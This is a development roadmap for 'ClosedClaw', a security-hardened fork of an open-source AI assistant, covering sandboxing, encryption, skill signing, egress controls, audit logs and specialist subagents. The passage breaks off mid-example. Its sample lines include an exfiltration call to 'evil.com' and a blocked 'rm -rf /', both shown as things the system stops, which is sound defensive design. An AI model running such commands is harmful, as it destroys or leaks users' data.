# ClosedClaw Fork Roadmap

## Executive Summary

**Objective**: Fork OpenClaw into ClosedClaw with enhanced security, power, and personalization while maintaining the ability to selectively adopt upstream improvements.

**Status**: Fork already established (v2026.2.1). Rebranding complete. Core infrastructure operational.

**License**: MIT (upstream), MIT (fork) — legally straightforward.

**Key Differentiator**: ClosedClaw will have self-awareness of its upstream relationship and can autonomously propose/apply OpenClaw security patches and feature updates.

**Revolutionary Concept**: ClosedClaw uses its own subagent system to build, maintain, audit, and improve itself - a **self-evolving AI development platform**.

---

## Context

### Upstream Ecosystem

| Resource | Purpose | Relevance |
|---|---|---|
| [OpenClaw](https://openclaw.ai) | Open-source personal AI assistant by Peter Steinberger. MIT licensed. Multi-channel (WhatsApp/Telegram/Discord/Slack/Signal/iMessage), persistent memory, browser control, skills/plugins | Direct upstream source |
| [Moltbook](https://moltbook.com) | Social network for AI agents (~2M registered). Agents interact, post, upvote | Community signal, not required |
| [MoltbotWiki](https://moltbotwiki.com) | Community documentation for OpenClaw/Moltbot | User expectations reference |

### Current ClosedClaw State

- ✅ Full source tree: gateway, agents, channels, routing, config, plugins, media pipeline, CLI, web UI
- ✅ 30+ extensions: matrix, msteams, slack, telegram, voice-call, memory systems
- ✅ Security foundation: audit tooling, SSRF guards, TLS 1.3, plugin path traversal protection, prompt safety guardrails
- ✅ Rebranding: `ClosedClaw` binary, paths updated from `.clawdbot` → `.closedclaw`

---

## Phase 0: Foundation & Self-Awareness (Week 1-2)

### Priority 1: Establish Upstream Tracking (CRITICAL)

**Goal**: ClosedClaw knows about OpenClaw's state and can diff itself.

#### Tasks

1. **Git remote configuration**
   ```bash
   git remote add openclaw https://github.com/openclaw/openclaw.git
   git fetch openclaw
   git branch --set-upstream-to=openclaw/main openclaw-tracking
   ```

2. **Create `closedclaw upstream` command suite**
   - `closedclaw upstream status` - compare versions, show divergence
   - `closedclaw upstream diff` - semantic diff of security/config/core files
   - `closedclaw upstream sync --preview` - show what would change
   - `closedclaw upstream sync --security-only` - apply only security patches
   - `closedclaw upstream sync --interactive` - choose commits/files to merge

3. **Upstream awareness metadata**
   - Store in `~/.closedclaw/upstream-tracking.json5`:
     ```json5
     {
       fork_point: "v2026.2.1",
       last_sync: "2026-02-08T00:00:00Z",
       upstream_version: "v2026.2.3",
       divergence_commits: 47,
       security_patches_pending: [
         "CVE-2026-XXXX: RCE in skill loader",
         "SSRF bypass in media fetch"
       ],
       features_available: [
         "Multi-model routing",
         "Enhanced Canvas API"
       ]
     }
     ```

4. **Automated upstream monitoring**
   - Daily cron job: check OpenClaw releases
   - Extract security-relevant commits (scan for "Security:", "CVE-", "fix:", "SSRF", "XSS", "RCE")
   - Notify via configured channel: "🔒 OpenClaw released security patch: [title]"

#### Implementation Notes

- Use `git log openclaw/main ^HEAD` to find new commits
- Parse conventional commit messages for classification
- Use AST diff (not just text diff) for semantic change detection
- Store accept/reject decisions to avoid re-prompting

**Deliverable**: `closedclaw upstream status` works and shows pending changes.

---

## Phase 1: Security Hardening (Week 2-4) — HIGHEST PRIORITY

### Priority 2: Mandatory Sandboxing for Tool Execution ✅ COMPLETED

**Status**: ✅ **Implemented** (2026-02-08)

**Delivered**:
- Changed default sandbox mode from `"off"` to `"all"` — all tool execution now sandboxed by default
- Added comprehensive security audit checks for sandbox misconfigurations:
  - Critical warning if `sandbox.mode="off"`
  - Warnings for `mode="non-main"`, writable workspace, network access, mutable filesystem, missing capability drops
- Updated documentation: [Mandatory Sandboxing](/docs/security/mandatory-sandboxing.md), [Sandboxing](/docs/gateway/sandboxing.md)
- Breaking change from OpenClaw: ClosedClaw is security-first; sandboxing is mandatory unless explicitly disabled

**Impact**: All tool calls (`exec`, `read`, `write`, `edit`, etc.) now run in isolated Docker containers with:
- Read-only root filesystem (`readOnlyRoot: true`)
- No network access (`network: "none"`)
- All Linux capabilities dropped (`capDrop: ["ALL"]`)
- Isolated workspace (`workspaceAccess: "none"`)

**Opt-out**: Users can disable with `agents.defaults.sandbox.mode="off"` (not recommended; flagged by audit)

**Previous planning context** (archived for reference):

**Original risk**: Optional sandboxing was insufficient. Malicious skills could compromise host.

**Original target**: All shell commands, file operations, and skill execution run in isolated namespaces.

#### Implementation Options

| Technology | Pros | Cons | Verdict |
|---|---|---|---|
| Docker | Well-tested, cross-platform | Heavyweight, requires daemon | macOS/Linux servers |
| nsjail | Lightweight, Linux namespaces | Linux-only | Linux primary |
| Landlock LSM | Kernel-level, minimal overhead | Linux ≥5.13, complexity | Future enhancement |
| macOS Sandbox | Native macOS | macOS-only, limited | macOS secondary |
| WSL2 + nsjail | Works on Windows | Two-layer overhead | Windows acceptable |

#### Tasks

1. **Add `config.security.sandbox` schema**
   ```json5
   security: {
     sandbox: {
       mode: "mandatory", // "mandatory" | "opt-in" | "disabled"
       engine: "auto",    // "auto" | "docker" | "nsjail" | "macos-sandbox"
       allowedPaths: ["/tmp", "~/.closedclaw/workspace"],
       allowNetwork: false,
       maxMemoryMB: 512,
       maxCPUPercent: 50,
       timeoutSeconds: 300
     }
   }
   ```

2. **Implement sandbox executor** (`src/security/sandbox-executor.ts`)
   - Detect available sandbox engine at startup
   - Wrap all tool calls through sandbox boundary
   - Pass stdin/stdout/stderr streams cleanly
   - Enforce resource limits

3. **Upgrade `run_in_terminal` tool**
   - Insert sandbox wrapper before command execution
   - Preserve environment variables per allowlist
   - Map workspace paths into sandbox

4. **Add `closedclaw security audit --sandbox` check**
   - Verify sandbox is enabled
   - Test sandbox escape attempts
   - Confirm resource limits enforced

**Deliverable**: `closedclaw agent --message "run ls -la /"` executes in isolated namespace, cannot access host filesystem outside allowlist.

**Risk mitigation**: Sandbox breakout is still possible. This is defense-in-depth, not silver bullet.

---

### Priority 3: End-to-End Encrypted Memory Storage ✅ COMPLETED

**Status**: ✅ **Implemented** (2026-02-08)

**Delivered**:
- XChaCha20-Poly1305 authenticated encryption with Argon2id key derivation
- User-controlled passphrases via `ClosedClaw_PASSPHRASE` env var or `~/.closedclaw/.passphrase` file
- Transparent read/write through `EncryptedStore` abstraction
- CLI commands: `closedclaw security encrypt --status`, `--migrate`
- Dependencies: `@noble/ciphers@0.6.0`, `@noble/hashes@1.5.0` (audited libraries)
- Opt-in for now (requires explicit passphrase configuration)
- Documentation: [Encrypted Memory Storage](/docs/security/encrypted-memory.md)

**Previous planning context** (archived for reference):

**Original risk**: All memory, credentials, session data stored in plaintext at `~/.closedclaw/`

**Original target**: Encrypted at rest with user-controlled passphrase.

#### Tasks

1. **Choose encryption library**
   - Recommendation: `@noble/ciphers` (audited, modern) or `age` (format-stable)
   - Reject: `crypto-js` (outdated), raw `node:crypto` (too low-level)

2. **Add passphrase management**
   - On first run: `closedclaw onboard --set-passphrase`
   - Store salted key derivation params (argon2id recommended)
   - Unlock: `closedclaw gateway --unlock` (prompts for passphrase)
   - OS keychain integration (Priority 7) comes later

3. **Encrypt at boundaries** (`src/config/encrypted-store.ts`)
   ```typescript
   class EncryptedStore {
     constructor(private passphrase: string) {}
     
     async read<T>(path: string): Promise<T> {
       const encrypted = await fs.readFile(path);
       const decrypted = await decrypt(encrypted, this.passphrase);
       return JSON.parse(decrypted);
     }
     
     async write<T>(path: string, data: T): Promise<void> {
       const json = JSON.stringify(data);
       const encrypted = await encrypt(json, this.passphrase);
       await fs.writeFile(path, encrypted);
     }
   }
   ```

4. **Migrate existing stores**
   - `closedclaw security encrypt --migrate`
   - Detect plaintext files, prompt to encrypt
   - Keep metadata unencrypted (version, timestamps) for doctor/status commands

5. **Update config schema**
   ```json5
   security: {
     encryption: {
       enabled: true,
       algorithm: "chacha20-poly1305",
       kdf: "argon2id",
       kdfParams: {
         memory: 65536,  // 64 MB
         iterations: 3,
         parallelism: 4
       }
     }
   }
   ```

**Deliverable**: After `closedclaw onboard --set-passphrase`, all files under `~/.closedclaw/` are encrypted. Gateway won't start without passphrase.

**UX consideration**: Auto-lock after N hours of inactivity? Re-prompt on wake from sleep?

---

### Priority 4: Skill/Plugin Signing & Verification

**Current risk**: Skills execute arbitrary code. No trust chain beyond URL source.

**Target**: Cryptographic signatures required for skill installation. Community trust web.

#### Tasks

1. **Design signature format** (`.skill.md.sig`)
   ```
   -----BEGIN CLOSEDCLAW SKILL SIGNATURE-----
   Algorithm: ed25519
   Signer: alice@closedclaw.dev
   Key-ID: 0xA3F8B9...
   Timestamp: 2026-02-08T12:00:00Z
   
   [base64-encoded signature of skill.md]
   -----END CLOSEDCLAW SKILL SIGNATURE-----
   ```

2. **Implement signer tool**
   ```bash
   closedclaw skill sign ./my-skill.md --key ~/.closedclaw/signing-key.pem
   # Outputs: my-skill.md.sig
   ```

3. **Verification during install**
   - `closedclaw skill install <url>` downloads both `.md` and `.md.sig`
   - Verify signature matches public key in trusted keyring
   - Prompt if unsigned: "⚠️  This skill is unsigned. Install anyway? [y/N]"
   - Config option: `security.skills.requireSignature: true` (default false, breaking change)

4. **Trust keyring** (`~/.closedclaw/trusted-keys.json`)
   ```json5
   {
     "0xA3F8B9...": {
       name: "Alice Developer",
       trust_level: "full",  // "full" | "marginal" | "none"
       added: "2026-02-08",
       verified_via: "manual"  // "manual" | "web-of-trust" | "certificate"
     }
   }
   ```

5. **Web of trust (optional)**
   - Skills can declare `Trusted-By: 0xA3F8B9...`
   - Transitive trust: "Alice trusts Bob, Bob signed this skill"

6. **VirusTotal integration** (already exists upstream)
   - Extend to: submit skill hash to VirusTotal before execution
   - Block if flagged by >3 engines

**Deliverable**: `closedclaw skill install https://example.com/sketch-skill.md` fails if unsigned when `security.skills.requireSignature: true`.

**Community note**: Need to establish initial keyring. Bootstrap with OpenClaw community keys? Or fresh ClosedClaw CA?

---

### Priority 5: Network Egress Controls

**Goal**: Prevent data exfiltration by malicious skills/agents.

#### Tasks

1. **Allowlist configuration**
   ```json5
   security: {
     network: {
       mode: "allowlist",  // "allowlist" | "denylist" | "unrestricted"
       allowedDomains: [
         "*.anthropic.com",
         "*.openai.com",
         "api.github.com",
         "hooks.slack.com"
       ],
       blockPrivateIPs: true,  // Already implemented (SSRF guards)
       logAllConnections: true
     }
   }
   ```

2. **Implement in HTTP client wrapper** (`src/infra/http-client.ts`)
   - Before every `fetch()`, check domain against allowlist
   - DNS resolution check for blocked IPs
   - Log denied attempts to audit log

3. **Proxy/MITM mode (advanced)**
   - Run local HTTP proxy
   - Route all agent traffic through proxy
   - Inspect TLS SNI for domain filtering

**Deliverable**: Agent attempting `fetch("https://evil.com/exfil")` fails with "Domain not in allowlist" error.

---

### Priority 6: Immutable Audit Logging

**Goal**: Forensic record of all high-risk operations.

#### Tasks

1. **Audit log format** (JSONL, one event per line)
   ```jsonl
   {"ts":"2026-02-08T12:00:00Z","type":"tool_exec","tool":"run_in_terminal","cmd":"rm -rf /","user":"main","session":"agent:main:telegram:dm:12345","result":"blocked_by_sandbox"}
   {"ts":"2026-02-08T12:01:00Z","type":"config_change","key":"security.sandbox.mode","old":"opt-in","new":"mandatory","changed_by":"admin"}
   {"ts":"2026-02-08T12:02:00Z","type":"skill_install","skill":"malicious-skill","url":"https://sketchy.com/skill.md","sig_verified":false,"installed":false}
   ```

2. **Storage**: `~/.closedclaw/audit.log` (append-only, encrypted)

3. **Hook into critical paths**
   - All tool executions
   - Config writes
   - Skill/plugin installs
   - Channel message sends (optional, can be noisy)
   - Credential access

4. **Audit query tool**
   ```bash
   closedclaw audit query --since 1h --type tool_exec --failed
   closedclaw audit query --grep "rm -rf"
   closedclaw audit export --format csv --to audit-report.csv
   ```

**Deliverable**: All dangerous operations are logged. Logs survive agent restarts.

---

### Priority 7: OS Keychain Integration

**Goal**: Stop storing credentials as plaintext JSON files.

#### Platform Support

| Platform | Keychain | Library |
|---|---|---|
| macOS | Keychain.app | `keytar` or native `security` CLI |
| Linux | Secret Service API | `libsecret` via `keytar` |
| Windows | Credential Manager | `keytar` |

#### Tasks

1. **Install `keytar` (or equivalent)**
   ```bash
   npm install keytar
   ```

2. **Wrapper module** (`src/security/keychain.ts`)
   ```typescript
   export async function storeCredential(service: string, account: string, password: string): Promise<void>
   export async function getCredential(service: string, account: string): Promise<string | null>
   export async function deleteCredential(service: string, account: string): Promise<boolean>
   ```

3. **Migrate credential stores**
   - `~/.closedclaw/credentials/*.json` → OS keychain
   - Service name: `ClosedClaw:anthropic`, `ClosedClaw:openai`, etc.
   - Account: user's email or API key identifier

4. **Fallback for headless environments**
   - If no keychain available (Docker, headless Linux), fall back to encrypted file store (Priority 3)

**Deliverable**: `closedclaw onboard` stores API keys in OS keychain. `ls ~/.closedclaw/credentials/` is empty.

---

## Phase 1.5: Code Quality & Architecture (Week 4-5)

### Priority 3.5: Consolidate Constants Library

**Current State**: Constants are scattered across 40+ files without centralized management.

**Problem**: 
- Magic strings and default values defined inline throughout codebase
- Difficult to audit security defaults
- Testing requires mocking multiple imports
- No single source of truth for configuration values

**Examples of scattered constants**:
```typescript
// Currently spread across:
src/security/passphrase.ts: DEFAULT_PASSPHRASE_ENV_VAR = "ClosedClaw_PASSPHRASE"
src/security/crypto.ts: DEFAULT_ENCRYPTION_CONFIG = {...}
extensions/gtk-gui/: DEFAULT_SOCKET_PATH, DEFAULT_INBOX_PATH, DEFAULT_OUTBOX_PATH
extensions/zalo/: DEFAULT_MEDIA_MAX_MB = 5
extensions/diagnostics-otel/: DEFAULT_SERVICE_NAME = "ClosedClaw"
```

#### Tasks

1. **Create centralized constants directory**
   ```
   src/constants/
   ├── security.ts       // Security defaults (timeouts, limits, algorithms)
   ├── channels.ts       // Channel IDs, default paths, webhooks
   ├── limits.ts         // Timeouts, memory limits, token caps, file sizes
   ├── paths.ts          // File system paths, directories
   ├── network.ts        // URLs, domains, ports
   └── index.ts          // Re-export everything with namespaces
   ```

2. **Type-safe constants with enums**
   ```typescript
   // src/constants/security.ts
   export const SECURITY = {
     ENCRYPTION: {
       ALGORITHM: 'xchacha20-poly1305' as const,
       KDF: 'argon2id' as const,
       DEFAULT_MEMORY: 65536,
       DEFAULT_ITERATIONS: 3,
       DEFAULT_PARALLELISM: 4,
     },
     PASSPHRASE: {
       ENV_VAR: 'ClosedClaw_PASSPHRASE',
       MIN_LENGTH: 12,
       REQUIRED_CHAR_TYPES: 3,
     },
     SANDBOX: {
       DEFAULT_MODE: 'all' as const,
       DEFAULT_TIMEOUT_SEC: 300,
       DEFAULT_MEMORY_MB: 512,
     },
   } as const;
   ```

3. **Extract and migrate existing constants**
   - Audit all `DEFAULT_*` exports across codebase
   - Move to appropriate constants file
   - Update imports (can use Coder subagent for this!)
   - Add deprecation warnings for old locations

4. **Add tests for constant values**
   ```typescript
   // src/constants/security.test.ts
   describe('Security constants', () => {
     it('should use secure encryption algorithm', () => {
       expect(SECURITY.ENCRYPTION.ALGORITHM).toBe('xchacha20-poly1305');
     });
     
     it('should enforce minimum passphrase length', () => {
       expect(SECURITY.PASSPHRASE.MIN_LENGTH).toBeGreaterThanOrEqual(12);
     });
   });
   ```

5. **Documentation co-location**
   - Each constant file includes JSDoc with rationale
   - Links to security advisories, RFC specs, OWASP guidelines

**Benefits**:
- ✅ Single source of truth reduces configuration drift
- ✅ Easy security audits (one directory to review)
- ✅ Simplified testing (mock one import vs hunting 40+ files)
- ✅ Type-safe constants prevent typos
- ✅ Better IDE autocomplete and documentation
- ✅ Easier onboarding for new contributors

**Deliverable**: All magic strings and defaults consolidated. `import { SECURITY, LIMITS, PATHS } from '../constants'` works everywhere.

**Effort**: 2-3 days (mostly mechanical refactoring)

---

### Strategic Benefits of Divergence

This section documents **why** ClosedClaw's fork provides value beyond OpenClaw.

#### Security-First Architecture (Enterprise Advantage)

| Feature | ClosedClaw (Fork) | OpenClaw (Upstream) | Business Value |
|---------|-------------------|---------------------|----------------|
| **Mandatory sandboxing** | ✅ Default on (Priority 2) | Optional, defaults off | Enterprise adoption, compliance (SOC2, ISO 27001) |
| **Encrypted memory** | ✅ Default with passphrase (Priority 3) | Plaintext everything | GDPR, HIPAA, data residency requirements |
| **Skill signing** | 🔄 Planned (Priority 4) | Unsigned code execution | Supply chain security, zero-trust architecture |
| **Network egress controls** | 🔄 Planned (Priority 5) | Unrestricted | Data exfiltration prevention, compliance |
| **Immutable audit logs** | 🔄 Planned (Priority 6) | Basic logging | Forensics, incident response, compliance |
| **OS keychain integration** | 🔄 Planned (Priority 7) | Plaintext credential files | Credential theft prevention |

**Market positioning**: ClosedClaw can be deployed in regulated industries (finance, healthcare, government) where OpenClaw cannot.

#### Self-Awareness & Intelligent Maintenance

**Revolutionary capability** (unique to ClosedClaw):

```bash
# ClosedClaw knows about OpenClaw and manages itself
closedclaw upstream status              # Compare versions, show divergence
closedclaw upstream diff --security     # Show security patches
closedclaw upstream sync --security-only # Auto-apply upstream fixes
```

**Value proposition**: ClosedClaw can **autonomously propose and test** OpenClaw security patches:
- Parse conventional commits for classification
- Run semantic AST diff (not just text diff)
- Test patches in isolated sandbox
- Notify user via configured channel
- Apply with one command

**No other AI fork has this capability.** It's meta-AI: the assistant maintaining itself.

#### Personalization Without Upstream Constraints

ClosedClaw can experiment with features **too opinionated for OpenClaw**:
- Multi-agent squad system (DevOps, Researcher, Coder specialists)
- Advanced graph-based memory with relationships
- Multi-model orchestration (route by intent)
- Declarative automation workflows (YAML)
- Proactive monitoring (RSS, calendar, price alerts)

Upstream must serve a broad user base; ClosedClaw can optimize for power users.

---

## Phase 2: Power Enhancements (Week 5-7)

### Priority 8: Multi-Model Orchestration

**Goal**: Route different tasks to specialized models. Automatic failover.

#### Example Use Cases

- Use Opus for complex reasoning
- Use Haiku for simple triage
- Use local Llama for sensitive data (never leaves machine)
- Fallback chain: Claude → GPT-4 → local model

#### Tasks

1. **Extend agent config**
   ```json5
   agents: {
     list: [
       {
         id: "main",
         routing: {
           default: "claude-opus-4.5",
           triage: "claude-haiku-4.0",   // Fast, cheap model for "is this urgent?"
           reasoning: "claude-opus-4.5",  // Deep thinking
           sensitive: "ollama:llama3",    // Never hits API
         },
         fallbackChain: ["claude-opus-4.5", "gpt-4o", "ollama:llama3"]
       }
     ]
   }
   ```

2. **Intent classifier** (`src/agents/intent-router.ts`)
   - Lightweight model or heuristic: classify incoming message as `triage | reasoning | sensitive | creative | ...`
   - Route to appropriate model

3. **Fallback handler**
   - On 429 (rate limit), 503 (service down), 401 (bad key): try next in chain
   - Log fallback events to audit log

4. **Cost tracking**
   - Track token usage per model
   - CLI: `closedclaw usage --model claude-opus-4.5 --since 7d`

**Deliverable**: Send "remind me to call mom" → Haiku. Send "explain quantum entanglement" → Opus.

---

### Priority 9: Advanced Memory System

**Goal**: Move beyond flat file memory to structured, queryable, graph-based memory.

#### Architecture

- **Vector DB**: LanceDB (extension already exists)
- **Graph DB**: Neo4j or lightweight alternative (e.g., `level-graph`)
- **Hybrid**: embeddings for semantic search + graph for relationships

#### Tasks

1. **Enable memory-lancedb extension**
   - Already in `extensions/memory-lancedb/`
   - Test, document, promote to default

2. **Add relationship memory**
   ```typescript
   // Track: Alice is Bob's sister, Bob works at Acme Corp
   graph.addEdge("Alice", "sister", "Bob");
   graph.addEdge("Bob", "works_at", "Acme Corp");
   
   // Query: "Who works at Acme Corp?"
   const employees = graph.query({relation: "works_at", object: "Acme Corp"});
   ```

3. **Memory consolidation**
   - Nightly job: deduplicate memories, strengthen frequently accessed facts
   - Forget low-relevance memories after 90 days

4. **Memory inspector**
   ```bash
   closedclaw memory search "topics related to quantum physics"
   closedclaw memory graph --visualize  # Export GraphViz or D3 visualization
   ```

**Deliverable**: Agent remembers "Alice mentioned she's vegetarian last month" and proactively suggests vegetarian restaurants when planning with Alice.

---

### Priority 10: Declarative Workflow Engine

**Goal**: Multi-step automation beyond single-shot agent prompts.

#### Example Workflow (YAML or JSON5)

```yaml
name: weekly-report
trigger:
  cron: "0 9 * * FRI"
steps:
  - name: fetch-metrics
    tool: github_api
    params:
      action: fetch_pr_stats
      repo: closedclaw/closedclaw
      since: 7d
  
  - name: summarize
    agent: main
    prompt: "Summarize these GitHub stats: {{steps.fetch-metrics.output}}"
  
  - name: send-report
    tool: send_message
    params:
      channel: slack
      to: "#team"
      message: "{{steps.summarize.output}}"
```

#### Tasks

1. **Workflow schema** (`src/workflows/schema.ts`)
   - Parse YAML/JSON5 workflow definitions
   - Validate: dependencies, parameter types, tool existence

2. **Workflow executor** (`src/workflows/executor.ts`)
   - DAG execution: topological sort, parallel where possible
   - Error handling: retry policies, rollback
   - State persistence: resume after crash

3. **CLI**
   ```bash
   closedclaw workflow run ./workflows/weekly-report.yaml
   closedclaw workflow list --active
   closedclaw workflow logs weekly-report
   ```

4. **UI integration** (Web UI)
   - Visual workflow builder (drag-and-drop)
   - Execution history, logs

**Deliverable**: Automate "every Friday at 9am, generate team report and post to Slack" without manual intervention.

---

### Priority 11: Enhanced Proactive Agent (Heartbeats++)

**Current**: Basic cron jobs and heartbeats.

**Target**: Conditional triggers, smart notifications, predictive actions.

#### Examples

- "Notify me if HackerNews mentions 'ClosedClaw'"
- "If my calendar shows a meeting in 15 minutes and I'm not near my desk, remind me"
- "When Bitcoin drops below $50k, alert me"

#### Tasks

1. **Condition DSL** (simple expression language)
   ```javascript
   // Trigger format
   {
     type: "rss_monitor",
     feed: "https://hnrss.org/newest",
     condition: "item.title.includes('ClosedClaw')",
     action: {tool: "send_message", params: {channel: "telegram", message: "HN alert: {{item.title}}"}}
   }
   ```

2. **Trigger engine** (`src/cron/trigger-engine.ts`)
   - Evaluate conditions every N seconds
   - Fire actions when condition ⊢ true
   - Rate-limit to avoid spam

3. **State tracking**
   - Remember "already alerted about this HN post"
   - Re-alert if condition stays true for >1 hour

**Deliverable**: Real-time monitoring without polling.

---

### Priority 12: MCP Server Integration

**Goal**: First-class support for Model Context Protocol (MCP) for tool/resource discovery.

#### Tasks

1. **MCP client** (`src/tools/mcp-client.ts`)
   - Connect to MCP servers (local or remote)
   - Discover available tools
   - Translate MCP tool schemas → ClosedClaw tool format

2. **Auto-registration**
   - User starts MCP server: `llm-server --mcp`
   - ClosedClaw discovers it: `closedclaw tools discover --mcp-server http://localhost:8000`
   - Tools instantly available to agent

3. **Extension pattern**
   - Each MCP server = plugin
   - Dynamic loading without restart

**Deliverable**: Connect to any MCP-compatible server, agent can invoke its tools.

---

## Phase 2.5: Meta-Development & Agent Specialization (Week 7-9)

### Priority 12.5: DevOps Subagent for Self-Maintenance

**Concept**: Use ClosedClaw's existing [subagent system](/docs/tools/subagents.md) to create specialized agents that develop, audit, and maintain ClosedClaw itself.

**Subagent Architecture**:
- Subagents run in isolated sessions (`agent:<agentId>:subagent:<uuid>`)
- Background execution, report results back when complete
- Can use different models (e.g., Opus for analysis, Haiku for simple tasks)
- Tool access controlled via allowlists
- Auto-archive after completion

#### DevOps Agent Profile

Create `~/.closedclaw/agents/devops.md`:

```markdown
# DevOps Agent - ClosedClaw Internal IT

You are a specialized DevOps agent responsible for maintaining, auditing, and improving ClosedClaw itself.

## Core Responsibilities
- **Security audits**: Scan for vulnerabilities, check sandbox configs, validate encryption
- **Code quality**: Detect anti-patterns, duplicated code, magic strings, type safety issues
- **Performance**: Identify bottlenecks, memory leaks, inefficient patterns
- **Documentation**: Flag outdated docs, missing API documentation, broken links
- **Testing**: Check coverage, suggest missing test cases, identify untested code paths

## Tools Available
- `read`: Inspect source code files
- `exec`: Run linters, tests, build commands (sandboxed)
- `grep_search`: Search codebase for patterns
- `semantic_search`: Find similar code blocks
- `list_code_usages`: Track function/class usage
- Custom: `closedclaw security audit`, `closedclaw doctor`, `closedclaw test`

## Analysis Protocol
1. Understand the task scope
2. Search codebase for relevant context
3. Analyze code with security/performance/maintainability lens
4. Cross-reference with documentation
5. Generate actionable recommendations

## Output Format
Always structure findings as:
- **Severity**: Critical | High | Medium | Low
- **Category**: Security | Performance | Maintainability | Documentation | Testing
- **Location**: File:Line or directory pattern
- **Issue**: What's wrong (be specific)
- **Recommendation**: How to fix (actionable steps)
- **Effort**: Trivial (<1hr) | Moderate (1-4hr) | Significant (>4hr)
- **Priority**: Immediate | This Week | This Month | Backlog

## Coding Standards (ClosedClaw-specific)
- ESM imports only
- Strict TypeScript (no `any` unless justified)
- ~500-700 lines per file guideline
- Oxlint/Oxfmt compliant
- Test coverage: ≥70% lines/branches/functions/statements
- Security-first: validate inputs, handle errors, principle of least privilege
```

#### Usage Examples

**1. Security Audit**
```typescript
// User: "Run a security audit of the encryption implementation"

// Main agent spawns DevOps subagent:
sessions_spawn({
  agentId: "devops",
  task: `Audit src/security/* for:
    - Hardcoded secrets or weak crypto parameters
    - Missing input validation on user-supplied data
    - Error handling gaps (information leakage)
    - Documentation accuracy vs implementation
    - Test coverage for edge cases
    - Compliance with OWASP guidelines`,
  model: "claude-opus-4.5",  // Premium model for code analysis
  runTimeoutSeconds: 300,
  cleanup: "keep"  // Keep transcript for follow-up
})

// DevOps agent runs independently, then announces:
// "✅ Security Audit Complete (5m 12s, 15k tokens, $0.23)
//  
//  Severity Breakdown: 0 critical, 2 high, 5 medium, 8 low
//  
//  HIGH #1: src/security/passphrase.ts:189
//  Category: Security
//  Issue: Passphrase validation only runs client-side before encryption.
//         Malicious client could bypass and use weak passphrase.
//  Recommendation: Add server-side validation in deriveKey() before Argon2id.
//  Effort: Trivial (10 lines, add validatePassphrase() call)
//  Priority: This Week
//  
//  HIGH #2: src/security/encrypted-store.ts:78
//  Category: Security  
//  Issue: atomicWrite() doesn't verify file permissions after creation.
//         Race condition: file created 0o644, then chmod 0o600.
//  Recommendation: Use fs.writeFile with mode option, then verify.
//  Effort: Trivial (5 lines)
//  Priority: This Week
//  
//  [Full report: ~/.closedclaw/sessions/agent:devops:subagent:abc123.json]"
```

**2. Code Quality Scan**
```bash
User: "Find all TODO comments and create prioritized task list"

# DevOps subagent:
# 1. Searches for TODO/FIXME/HACK/XXX comments
# 2. Analyzes surrounding code context
# 3. Categorizes by urgency (based on criticality of affected code)
# 4. Outputs Markdown task list with effort estimates
```

**3. Performance Profiling**
```bash
User: "Profile the agent message handling pipeline and suggest optimizations"

# DevOps:
# 1. Traces code flow from message receipt → agent response
# 2. Identifies synchronous bottlenecks (await chains)
# 3. Suggests async refactoring, caching, lazy loading
# 4. Estimates performance improvement (% speedup)
```

**4. Breaking Change Detection**
```bash
User: "Compare current branch with v2026.2.1 and identify breaking API changes"

# DevOps:
# 1. Runs git diff between versions
# 2. Parses TypeScript exports (public API surface)
# 3. Detects removed/modified public functions, types, constants
# 4. Generates migration guide for users
```

#### Continuous Background Monitoring

**Config**: `~/.closedclaw/config.json5`
```json5
{
  cron: {
    jobs: [
      {
        id: "daily-security-audit",
        schedule: "0 2 * * *",  // 2am daily
        agentId: "devops",
        task: "Run security audit. Report only critical/high findings.",
        announceTarget: { channel: "telegram", peer: "your-id" }
      },
      {
        id: "weekly-code-quality",
        schedule: "0 10 * * 1",  // 10am Mondays
        agentId: "devops",
        task: "Analyze code quality metrics: duplication, complexity, test coverage. Suggest top 5 refactoring candidates."
      },
      {
        id: "monthly-dependency-audit",
        schedule: "0 9 1 * *",  // 9am 1st of month
        agentId: "devops",
        task: "Check for outdated npm dependencies with security vulnerabilities (npm audit). Prioritize patches."
      }
    ]
  }
}
```

**Deliverable**: ClosedClaw autonomously monitors its own health, security, and code quality. User receives proactive alerts.

---

### Priority 12.6: Multi-Agent Personal AI Squad

**Architecture**: Expand beyond single "main" agent to a **specialized agent team**.

**Current System** (already exists):
```typescript
// src/agents/
agents: {
  defaults: { ... },
  list: [
    { id: "main", model: "claude-opus-4.5", ... },
    { id: "research", model: "claude-opus-4", tools: { allow: ["web_search", "read"] } },
    { id: "coder", model: "claude-sonnet-4.5", sandbox: { mode: "all" } }
  ]
}
```

#### Proposed Agent Squad

Create role-specialized agents in `~/.closedclaw/agents/`:

```
~/.closedclaw/agents/
├── main.md                 # General-purpose assistant (you)
├── devops.md               # Internal IT specialist (above)
├── researcher.md           # Deep research with citations
├── coder.md                # Software development, TDD
├── analyst.md              # Data analysis, visualization
├── writer.md               # Long-form content, editing
├── planner.md              # Project management, scheduling
├── security.md             # Penetration testing, threat modeling
└── tutor.md                # Teaching, explanations, Socratic method
```

#### Example: Researcher Agent

**Profile** (`~/.closedclaw/agents/researcher.md`):
```markdown
# Researcher - Information Gathering Specialist

You are a research-focused agent. Your primary goal is deep, accurate information gathering with proper citations.

## Core Capabilities
- Web search with multi-source fact-checking
- Academic paper lookup (Semantic Scholar, arXiv)
- Citation formatting (APA, MLA, Chicago, IEEE)
- Source credibility assessment (check domain, author credentials)
- Multi-perspective synthesis

## Research Protocol
1. Break down question into sub-questions
2. Search authoritative sources first (academic .edu, .gov, .org)
3. Cross-reference claims across ≥3 independent sources
4. Flag unverifiable claims as [Citation Needed]
5. Provide confidence scores: High (3+ sources) / Medium (2 sources) / Low (1 source)

## Tools Priority
1. `web_search` (Brave Search API) - primary
2. `web_fetch` - full page content with readability mode
3. `read` - local knowledge base, saved papers
4. `web_tools` - browser automation for paywalled content (when justified)

## Output Format
Always include:
- **Summary**: 2-3 sentence TL;DR  
- **Key Findings**: Bullet points (5-10 max)
- **Sources**: Numbered citations [1], [2], etc. with full URLs
- **Confidence**: High | Medium | Low with justification
- **Caveats**: Known limitations, conflicting information
- **Follow-up**: Suggested deeper research paths

## Quality Checks
- Verify publication dates (prefer recent unless historical)
- Check author affiliations and potential biases
- Distinguish between primary sources and secondary commentary
- Note sample sizes, methodology for scientific claims
```

**Usage**:
```bash
User: "What are the security implications of argon2id vs scrypt for password hashing?"

Main: [analyzes] "This requires deep research. Let me spawn a specialist."

sessions_spawn({
  agentId: "researcher",
  task: "Research argon2id vs scrypt: security properties, attack resistance (GPU, ASIC), OWASP recommendations, real-world vulnerabilities, deployment considerations. Cite authoritative sources.",
  model: "claude-opus-4",
